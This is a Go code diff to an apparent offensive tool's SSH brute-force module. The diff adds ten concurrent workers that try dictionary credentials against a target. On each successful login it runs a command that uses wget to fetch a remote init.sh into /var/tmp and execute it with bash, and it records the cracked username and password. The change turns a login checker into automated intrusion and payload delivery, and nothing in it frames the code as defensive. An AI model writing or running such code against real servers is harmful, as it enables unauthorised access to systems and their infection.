@@ -6,7 +6,7 @@ import (
 	"github.com/cbot/proto/ssh"
 	"github.com/cbot/targets/source"
 	"strings"
-	"time"
+	"sync"
 )
 
 var SSHBruteForceAttackType = "SSHBruteForceAttack"
@@ -14,11 +14,14 @@ var SSHBruteForceAttackDefaultProto = "ssh"
 var SSHBruteForceAttackDefaultPort = 22
 var SSHBruteForceAttackName = "ssh_bruteforce_attack"
 var Timeout = 5000
+var SSHBruteForceTasks = 10
 
 type SSHBruteforceAttack struct {
+
 	dictPool    *DictPool
 	attackTasks *attack.AttackTasks
 }
+
 
 func (sba *SSHBruteforceAttack) Name() string {
 
@@ -50,8 +53,56 @@ func (sba *SSHBruteforceAttack) Accept(target source.Target) bool {
 	return false
 }
 
-func (sba *SSHBruteforceAttack) doAttack(ip string, port int, user string, passwd string) {
+func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient,ip string, port int, user string, passwd string) {
 
+	var ap *attack.AttackProcess
+
+	initUrl := sba.attackTasks.DownloadInitUrl(ip,port,SSHBruteForceAttackType,"init.sh")
+
+	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh",initUrl)
+
+	result, err := sshClient.RunCmd(cmd)
+
+	if err!=nil {
+
+		//attack failed
+		ap = &attack.AttackProcess{
+			TengoObj: attack.TengoObj{},
+			IP:       ip,
+			Host:     ip,
+			Port:     port,
+			Proto:    "ssh",
+			App:      "ssh",
+			OS:       "linux",
+			Name:     SSHBruteForceAttackName,
+			Type:     SSHBruteForceAttackType,
+			Status:   -1,
+			Payload:  cmd,
+			Result:   fmt.Sprintf("%v",err),
+			Details: fmt.Sprintf("%s|%s",user,passwd),
+		}
+
+	}else {
+
+		ap = &attack.AttackProcess{
+			TengoObj: attack.TengoObj{},
+			IP:       ip,
+			Host:     ip,
+			Port:     port,
+			Proto:    "ssh",
+			App:      "ssh",
+			OS:       "linux",
+			Name:     SSHBruteForceAttackName,
+			Type:     SSHBruteForceAttackType,
+			Status:   0,
+			Payload:  cmd,
+			Result:string(result),
+			Details: fmt.Sprintf("%s|%s",user,passwd),
+		}
+
+	}
+
+	sba.PubProcess(ap)
 }
 
 func (sba *SSHBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEntry) {
@@ -62,30 +113,12 @@ func (sba *SSHBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEn
 
 		return
 	}
+
 	defer sshClient.Close()
 
-	//bruteforce ok
-	result, err := sshClient.RunCmd("uname -a")
-
-	ap := &attack.AttackProcess{
-		TengoObj: attack.TengoObj{},
-		IP:       ip,
-		Host:     ip,
-		Port:     port,
-		Proto:    "ssh",
-		App:      "ssh",
-		OS:       "linux",
-		Name:     "BruteForce/SSH/OK",
-		Type:     "BruteForce/SSH",
-		Status:   0,
-		Payload:  "uname -a",
-		Result:   string(result),
-	}
-
-	sba.PubProcess(ap)
-
 	//start to attack
-	sba.doAttack(ip, port, entry.user, entry.pass)
+	sba.doAttack(sshClient,ip, port, entry.user, entry.pass)
+
 }
 
 func (sba *SSHBruteforceAttack) Run(target source.Target) error {
@@ -104,6 +137,31 @@ func (sba *SSHBruteforceAttack) Run(target source.Target) error {
 		return fmt.Errorf("Invalid ip:%s and port:%d", ip, port)
 	}
 
+	dictQueue := NewDictEntryQueue(dictEntries)
+
+	var wg sync.WaitGroup
+	wg.Add(SSHBruteForceTasks)
+
+	for i:=0;i<SSHBruteForceTasks;i++ {
+
+		go func() {
+
+			for {
+				entry := dictQueue.Pop()
+
+				if entry == nil {
+					break
+				}
+
+				sba.tryBruteforce(ip,port,entry)
+
+			}
+
+			wg.Done()
+		}()
+	}
+
+	return nil
 }
 
 func (sba *SSHBruteforceAttack) PubProcess(process *attack.AttackProcess) {
